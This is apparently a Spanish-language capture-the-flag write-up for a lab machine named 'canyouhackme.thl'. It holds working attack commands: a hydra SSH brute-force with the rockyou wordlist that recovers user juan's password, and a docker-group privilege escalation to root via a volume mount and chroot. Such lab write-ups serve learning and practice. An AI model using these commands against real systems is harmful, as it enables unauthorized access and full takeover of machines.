PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Visitamos el puerto 80 y nos dice de añadir el dominio 'canyouhackme.thl' al /etc/hosts

-En el código fuente nos dice que existe un usuario llamado 'juan'

-Fuerza Bruta con hydra por ssh a juan:
	-hydra ssh://192.168.1.152 -l juan -P /usr/share/wordlists/rockyou.txt -V
		-password: matrix

-Nos autenticamos por ssh y obtenemos acceso a la máquina:
	ssh juan@192.168.1.152
	-password: matrix

## Escalada de privilegios

-Vemos en que grupos estamos:
	-id
		1002(docker)

-Nos vamos a Gtfobins y pegamos el código del apartado de shell:
	-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
		root@42dd02df22cb:/# whoami
		root